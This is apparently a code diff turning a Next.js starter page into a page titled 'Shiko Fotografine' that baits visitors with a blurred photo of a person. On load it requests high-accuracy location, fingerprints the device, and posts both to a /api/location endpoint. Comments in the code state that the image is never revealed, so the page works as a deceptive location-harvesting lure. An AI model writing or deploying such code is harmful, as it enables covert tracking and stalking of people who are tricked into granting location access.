@@ -1,64 +1,201 @@
+"use client";
+
+import { useState, useEffect, useRef } from "react";
 import Image from "next/image";
 
+interface DeviceInfo {
+  userAgent: string;
+  platform: string;
+  language: string;
+  screenWidth: number;
+  screenHeight: number;
+  screenColorDepth: number;
+  timezone: string;
+  deviceType: string;
+  isMobile: boolean;
+  isTablet: boolean;
+  browser: string;
+  os: string;
+}
+
+interface LocationData {
+  latitude: number;
+  longitude: number;
+  accuracy?: number;
+  altitude?: number | null;
+  altitudeAccuracy?: number | null;
+  heading?: number | null;
+  speed?: number | null;
+  timestamp: string;
+  deviceInfo: DeviceInfo;
+}
+
 export default function Home() {
+  const [isLoading, setIsLoading] = useState(false);
+  const [locationSaved, setLocationSaved] = useState(false);
+  const hasRequestedLocation = useRef(false);
+
+  useEffect(() => {
+    // Automatically request location on page load - browser will show default permission alert
+    if (!hasRequestedLocation.current) {
+      hasRequestedLocation.current = true;
+      requestLocation();
+    }
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, []);
+
+  // Function to detect device type and browser
+  const getDeviceInfo = (): DeviceInfo => {
+    const userAgent = navigator.userAgent;
+    const screen = window.screen;
+    
+    // Detect device type
+    const isMobile = /iPhone|iPad|iPod|Android|webOS|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+    const isTablet = /iPad|Android/i.test(userAgent) && !/Mobile/i.test(userAgent);
+    
+    // Detect browser
+    let browser = 'Unknown';
+    if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) browser = 'Chrome';
+    else if (userAgent.includes('Firefox')) browser = 'Firefox';
+    else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) browser = 'Safari';
+    else if (userAgent.includes('Edg')) browser = 'Edge';
+    else if (userAgent.includes('Opera')) browser = 'Opera';
+    
+    // Detect OS
+    let os = 'Unknown';
+    if (userAgent.includes('Windows')) os = 'Windows';
+    else if (userAgent.includes('Mac')) os = 'macOS';
+    else if (userAgent.includes('Linux')) os = 'Linux';
+    else if (userAgent.includes('Android')) os = 'Android';
+    else if (userAgent.includes('iOS') || /iPhone|iPad|iPod/.test(userAgent)) os = 'iOS';
+    
+    // Detect device type name
+    let deviceType = 'Desktop';
+    if (isMobile) {
+      if (userAgent.includes('iPhone')) deviceType = 'iPhone';
+      else if (userAgent.includes('Android')) {
+        // Try to extract Android device model
+        const match = userAgent.match(/Android.*?; (.*?)(?:\)|;)/);
+        deviceType = match ? `Android ${match[1]}` : 'Android Phone';
+      } else deviceType = 'Mobile';
+    } else if (isTablet) {
+      if (userAgent.includes('iPad')) deviceType = 'iPad';
+      else deviceType = 'Tablet';
+    }
+
+    return {
+      userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      screenWidth: screen.width,
+      screenHeight: screen.height,
+      screenColorDepth: screen.colorDepth,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      deviceType,
+      isMobile,
+      isTablet,
+      browser,
+      os,
+    };
+  };
+
+  const requestLocation = () => {
+    if (!navigator.geolocation) {
+      return;
+    }
+
+    // This will trigger the browser's default location permission alert
+    // DO NOT show loading indicator before user accepts
+    navigator.geolocation.getCurrentPosition(
+      async (position) => {
+        // Only show activity indicator AFTER successfully getting location
+        setIsLoading(true);
+
+        const deviceInfo = getDeviceInfo();
+
+        const locationData: LocationData = {
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          accuracy: position.coords.accuracy,
+          altitude: position.coords.altitude,
+          altitudeAccuracy: position.coords.altitudeAccuracy,
+          heading: position.coords.heading,
+          speed: position.coords.speed,
+          timestamp: new Date().toISOString(),
+          deviceInfo,
+        };
+
+        try {
+          // Save location to database
+          const response = await fetch("/api/location", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(locationData),
+          });
+
+          if (response.ok) {
+            // Small delay to show activity indicator while processing
+            await new Promise((resolve) => setTimeout(resolve, 1500));
+            // Do NOT reveal image - keep it blurred
+            setIsLoading(false);
+            setLocationSaved(true);
+          } else {
+            setIsLoading(false);
+          }
+        } catch (err) {
+          setIsLoading(false);
+        }
+      },
+      () => {
+        // User denied permission or error occurred
+        // Do nothing - no loading indicator shown
+      },
+      {
+        enableHighAccuracy: true, // Request highest accuracy
+        timeout: 30000, // Increased timeout for better accuracy
+        maximumAge: 0, // Don't use cached location
+      }
+    );
+  };
+
   return (
-    <div className="flex min-h-screen items-center justify-center bg-zinc-50 font-sans dark:bg-black">
-      <main className="flex min-h-screen w-full max-w-3xl flex-col items-center justify-between py-32 px-16 bg-white dark:bg-black sm:items-start">
-        <Image
-          className="dark:invert"
-          src="/next.svg"
-          alt="Next.js logo"
-          width={100}
-          height={20}
-          priority
-        />
-        <div className="flex flex-col items-center gap-6 text-center sm:items-start sm:text-left">
-          <h1 className="max-w-xs text-3xl font-semibold leading-10 tracking-tight text-black dark:text-zinc-50">
-            To get started, edit the page.tsx file.
+    <div className="flex min-h-screen items-center justify-center bg-gradient-to-br from-purple-50 to-pink-50 dark:from-gray-900 dark:to-gray-800">
+      <main className="flex flex-col items-center justify-center w-full max-w-md px-6 py-8">
+        <div className="w-full mb-8">
+          <h1 className="text-2xl font-bold text-center text-gray-800 dark:text-gray-100 mb-2">
+            Shiko Fotografine
           </h1>
-          <p className="max-w-md text-lg leading-8 text-zinc-600 dark:text-zinc-400">
-            Looking for a starting point or more instructions? Head over to{" "}
-            <a
-              href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-              className="font-medium text-zinc-950 dark:text-zinc-50"
-            >
-              Templates
-            </a>{" "}
-            or the{" "}
-            <a
-              href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-              className="font-medium text-zinc-950 dark:text-zinc-50"
-            >
-              Learning
-            </a>{" "}
-            center.
-          </p>
         </div>
-        <div className="flex flex-col gap-4 text-base font-medium sm:flex-row">
-          <a
-            className="flex h-12 w-full items-center justify-center gap-2 rounded-full bg-foreground px-5 text-background transition-colors hover:bg-[#383838] dark:hover:bg-[#ccc] md:w-[158px]"
-            href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            <Image
-              className="dark:invert"
-              src="/vercel.svg"
-              alt="Vercel logomark"
-              width={16}
-              height={16}
-            />
-            Deploy Now
-          </a>
-          <a
-            className="flex h-12 w-full items-center justify-center rounded-full border border-solid border-black/[.08] px-5 transition-colors hover:border-transparent hover:bg-black/[.04] dark:border-white/[.145] dark:hover:bg-[#1a1a1a] md:w-[158px]"
-            href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            Documentation
-          </a>
+
+        <div className="relative w-full aspect-[3/4] rounded-2xl overflow-hidden shadow-2xl mb-6">
+          <Image
+            src="/images.jpeg"
+            alt="Person"
+            fill
+            className="object-cover blur-2xl transition-all duration-1000"
+            priority
+          />
+          {isLoading && (
+            <div className="absolute inset-0 flex items-center justify-center bg-black/30 backdrop-blur-sm">
+              <div className="flex flex-col items-center gap-4">
+                <div className="w-12 h-12 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
+                <p className="text-white text-sm font-medium">
+                  Processing location...
+                </p>
+              </div>
+            </div>
+          )}
         </div>
+
+        {!isLoading && !locationSaved && (
+          <div className="w-full">
+            <p className="text-sm text-center text-gray-600 dark:text-gray-400">
+              Please allow location access
+            </p>
+          </div>
+        )}
       </main>
     </div>
   );
